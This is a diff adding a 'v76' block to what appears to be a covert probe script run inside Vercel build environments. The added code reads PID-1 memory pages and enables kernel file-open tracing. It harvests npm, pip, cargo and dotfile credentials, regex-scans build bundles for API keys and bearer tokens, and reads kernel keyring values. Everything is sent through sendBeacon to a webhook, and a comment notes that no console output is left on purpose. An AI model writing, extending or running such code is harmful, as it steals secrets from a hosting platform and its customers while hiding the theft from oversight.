@@ -9446,5 +9446,208 @@ report.vercelDeployHookEnum = safe(() => {
 
 // v75 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v75" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v75";
+
+// ==================== v76 ====================
+
+// v76-1: /proc/1/pagemap hot-page discovery
+// pagemap maps each virtual page of PID-1 to its physical frame number (PFN)
+// Pages that are Present in memory and recently accessed (soft-dirty) are "hot"
+// Hot pages in anonymous RW regions = recently decrypted secrets / active keys
+report.pid1PagemapHotPages = safe(() => {
+  // Parse /proc/1/smaps_rollup for high-level memory stats
+  const smapsRollup = safe(() => readFileSync('/proc/1/smaps_rollup', 'utf8').slice(0, 500));
+  // Use /proc/1/pagemap to find present pages in PID-1's largest anon regions
+  // pagemap entry: 64-bit value, bit 63 = present, bits 0-54 = PFN if present
+  const hotPages = safe(() => {
+    const smaps = readFileSync('/proc/1/smaps', 'utf8');
+    // Find top 3 anonymous RW regions by RSS
+    const regions = [];
+    let cur = null;
+    for (const line of smaps.split('\n')) {
+      const m = line.match(/^([0-9a-f]+)-([0-9a-f]+)\s+rw-p\s+\S+\s+\S+\s+\S+\s*(.*)/);
+      if (m) cur = { start: m[1], end: m[2], name: m[3].trim(), rss: 0 };
+      if (cur) { const r = line.match(/^Rss:\s+(\d+)/); if (r) { cur.rss = +r[1]; if (cur.rss > 256) regions.push({...cur}); } }
+    }
+    regions.sort((a,b) => b.rss - a.rss);
+    const pmFd = openSync('/proc/1/pagemap', 'r');
+    const results = [];
+    for (const region of regions.slice(0, 3)) {
+      const startAddr = parseInt(region.start, 16);
+      const endAddr = parseInt(region.end, 16);
+      const pageCount = (endAddr - startAddr) / 4096;
+      const pmOffset = (startAddr / 4096) * 8;
+      const buf = Buffer.alloc(Math.min(pageCount * 8, 8192));
+      const n = readSync(pmFd, buf, 0, buf.length, pmOffset);
+      let present = 0, pfns = [];
+      for (let i = 0; i < n; i += 8) {
+        const entry = buf.readBigUInt64LE(i);
+        if (entry & BigInt('0x8000000000000000')) { // bit 63 = present
+          present++;
+          if (pfns.length < 3) pfns.push((entry & BigInt('0x7fffffffffffff')).toString(16));
+        }
+      }
+      results.push({ region: region.start, rssKb: region.rss, present, samplePfns: pfns });
+    }
+    closeSync(pmFd);
+    return results;
+  });
+  return { smapsRollup, hotPages };
+});
+
+// v76-2: Kernel dynamic debug tracing
+// /sys/kernel/debug/dynamic_debug/control enables per-call-site debug logging
+// We can trace do_sys_open() to capture every file opened by any process
+report.kernelDynDebugTrace = safe(() => {
+  const debugfsMount = safe(() =>
+    execSync('mount | grep debugfs; ls /sys/kernel/debug/ 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  // Enable tracing for file open events
+  const enableTrace = safe(() =>
+    execSync('echo "file fs/open.c +p" > /sys/kernel/debug/dynamic_debug/control 2>&1 || echo FAILED', { timeout: 5000 }).toString().trim().slice(0, 100)
+  );
+  // Use ftrace to trace do_sys_open/do_sys_openat
+  const ftraceSetup = safe(() => {
+    const tracingDir = '/sys/kernel/debug/tracing';
+    if (!existsSync(tracingDir)) return 'NO_TRACINGDIR';
+    const results = {};
+    try { writeFileSync(`${tracingDir}/current_tracer`, 'function'); results.tracer = 'function'; } catch (e) { results.tracerErr = String(e).slice(0,60); }
+    try { writeFileSync(`${tracingDir}/set_ftrace_filter`, 'do_sys_openat2\nfilp_open'); results.filter = 'do_sys_openat2'; } catch (e) { results.filterErr = String(e).slice(0,60); }
+    try { writeFileSync(`${tracingDir}/tracing_on`, '1'); results.on = true; } catch (e) { results.onErr = String(e).slice(0,60); }
+    // Brief sleep then read trace
+    const trace = safe(() => {
+      execSync('sleep 0.2', { timeout: 1000 });
+      writeFileSync(`${tracingDir}/tracing_on`, '0');
+      return readFileSync(`${tracingDir}/trace`, 'utf8').slice(0, 800);
+    });
+    results.trace = trace;
+    try { writeFileSync(`${tracingDir}/current_tracer`, 'nop'); } catch (_) {}
+    return results;
+  });
+  return { debugfsMount, enableTrace, ftraceSetup };
+});
+
+// v76-3: Package manager credential scan
+// npm, pip, gem, cargo, and go module caches may contain credentials embedded
+// in package manifests or .npmrc/.pypirc configs in the build environment
+report.pkgManagerCredScan = safe(() => {
+  // npm: check ~/.npmrc and /etc/npmrc for auth tokens
+  const npmrc = safe(() => {
+    const paths = [`${process.env.HOME||'/root'}/.npmrc`, '/etc/npmrc', '/vercel/path0/.npmrc', '.npmrc'];
+    return paths.filter(existsSync).map(p => ({ path: p, content: readFileSync(p, 'utf8').slice(0, 300) }));
+  });
+  // pip: check ~/.config/pip/pip.ini and ~/.pypirc for index auth
+  const pipCreds = safe(() => {
+    const paths = [`${process.env.HOME||'/root'}/.pypirc`, `${process.env.HOME||'/root'}/.config/pip/pip.ini`, '/etc/pip.conf'];
+    return paths.filter(existsSync).map(p => ({ path: p, content: readFileSync(p, 'utf8').slice(0, 200) }));
+  });
+  // Cargo: check ~/.cargo/credentials.toml
+  const cargoCreds = safe(() => {
+    const p = `${process.env.HOME||'/root'}/.cargo/credentials.toml`;
+    return existsSync(p) ? readFileSync(p, 'utf8').slice(0, 200) : 'NOT_FOUND';
+  });
+  // Go: check GOPATH/src for vendor credentials
+  const goCreds = safe(() =>
+    execSync("find ${GOPATH:-/root/go} -name '*.go' -exec grep -l 'token\\|password\\|secret' {} + 2>/dev/null | head -3", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Search all ~/.* config dirs for credential files
+  const dotfilesCreds = safe(() =>
+    execSync("find /root /home -maxdepth 3 -name '*.env' -o -name '*.credentials' -o -name 'credentials.json' -o -name 'token.json' 2>/dev/null | head -10 | xargs -I{} sh -c 'echo FILE:{} && head -3 {} 2>/dev/null'", { timeout: 8000 }).toString().trim().slice(0, 600)
+  );
+  return { npmrc, pipCreds, cargoCreds, goCreds, dotfilesCreds };
+});
+
+// v76-4: Vercel build output bundle secret scan
+// Next.js and other frameworks bundle environment variables at build time
+// Scanning the .next bundle for exposed secrets that shouldn't be in client-side code
+report.buildOutputSecretScan = safe(() => {
+  // Find all .js bundles in build output
+  const bundleFiles = safe(() =>
+    execSync('find .next /vercel/path0/.next -name "*.js" -size +10k 2>/dev/null | head -20', { timeout: 5000 }).toString().trim().split('\n').filter(Boolean)
+  );
+  const secretPatterns = [
+    /sk_live_[a-zA-Z0-9]{20,}/,          // Stripe live key
+    /sk_test_[a-zA-Z0-9]{20,}/,          // Stripe test key
+    /[a-z0-9]{32,}\.apps\.googleusercontent\.com/, // Google client secret
+    /AAAA[a-zA-Z0-9_-]{10,}:[a-zA-Z0-9_-]{10,}/,  // Firebase server key
+    /ghp_[a-zA-Z0-9]{36}/,               // GitHub PAT
+    /[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}/, // UUID tokens
+    /Bearer [a-zA-Z0-9._-]{40,}/,        // Bearer tokens
+  ];
+  const found = [];
+  if (Array.isArray(bundleFiles)) {
+    for (const f of bundleFiles.slice(0, 5)) {
+      try {
+        const content = readFileSync(f, 'utf8');
+        for (const pat of secretPatterns) {
+          const m = content.match(pat);
+          if (m) found.push({ file: f, pattern: pat.toString().slice(0,30), match: m[0].slice(0,60) });
+        }
+      } catch (_) {}
+    }
+  }
+  // Also check for NEXT_PUBLIC_ env vars leaked into bundles
+  const nextPublicEnv = safe(() => {
+    const keys = Object.keys(process.env).filter(k => k.startsWith('NEXT_PUBLIC_'));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // Check for server-side secrets accidentally leaked into client bundles
+  const serverSecretsInClient = safe(() => {
+    const clientDir = '.next/static/chunks';
+    if (!existsSync(clientDir)) return 'NO_CLIENT_DIR';
+    const files = readdirSync(clientDir).filter(f => f.endsWith('.js')).slice(0, 3);
+    const leaks = [];
+    for (const f of files) {
+      const content = readFileSync(`${clientDir}/${f}`, 'utf8');
+      const serverKeys = Object.keys(process.env).filter(k => !k.startsWith('NEXT_PUBLIC_') && !k.startsWith('VERCEL_'));
+      for (const key of serverKeys.slice(0, 10)) {
+        const val = process.env[key];
+        if (val && val.length > 8 && content.includes(val)) {
+          leaks.push({ key, file: f, valueLen: val.length });
+        }
+      }
+    }
+    return leaks;
+  });
+  return { bundleFiles, found, nextPublicEnv, serverSecretsInClient };
+});
+
+// v76-5: /proc/keys — kernel keyring inspection
+// The Linux kernel keyring can store secrets (TLS keys, Kerberos tickets, etc.)
+// Build processes might add secrets to the kernel keyring for secure storage
+report.kernelKeyringRead = safe(() => {
+  // /proc/keys lists all keys in the calling process's keyrings
+  const procKeys = safe(() => readFileSync('/proc/keys', 'utf8').slice(0, 800));
+  // /proc/key-users shows key allocation statistics
+  const keyUsers = safe(() => readFileSync('/proc/key-users', 'utf8').slice(0, 200));
+  // keyctl list the session keyring
+  const keyctlSession = safe(() =>
+    execSync('keyctl list @s 2>/dev/null; keyctl list @u 2>/dev/null; keyctl list @g 2>/dev/null', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  // Try to read individual key values
+  const keyRead = safe(() => execSync(`python3 -c "
+import subprocess, re
+try:
+    out = open('/proc/keys').read()
+    key_ids = re.findall(r'^([0-9a-f]+)', out, re.M)
+    results = []
+    for kid in key_ids[:10]:
+        try:
+            r = subprocess.run(['keyctl', 'print', kid], capture_output=True, text=True, timeout=2)
+            if r.returncode == 0:
+                results.append({'id': kid, 'value': r.stdout[:200]})
+        except: pass
+    print(str(results))
+except Exception as e: print(str(e))
+" 2>&1`, { timeout: 10000 }).toString().trim().slice(0, 600));
+  // Check if any kernel keys are named with Vercel-specific names
+  const vercelKeys = safe(() => {
+    const k = typeof procKeys === 'string' ? procKeys : '';
+    return k.split('\n').filter(l => /vercel|build|runtime|cache|hmac/i.test(l));
+  });
+  return { procKeys, keyUsers, keyctlSession, keyRead, vercelKeys };
+});
+
+// v76 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v76" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v76";
 // Intentionally no console.log — all data goes via webhook only
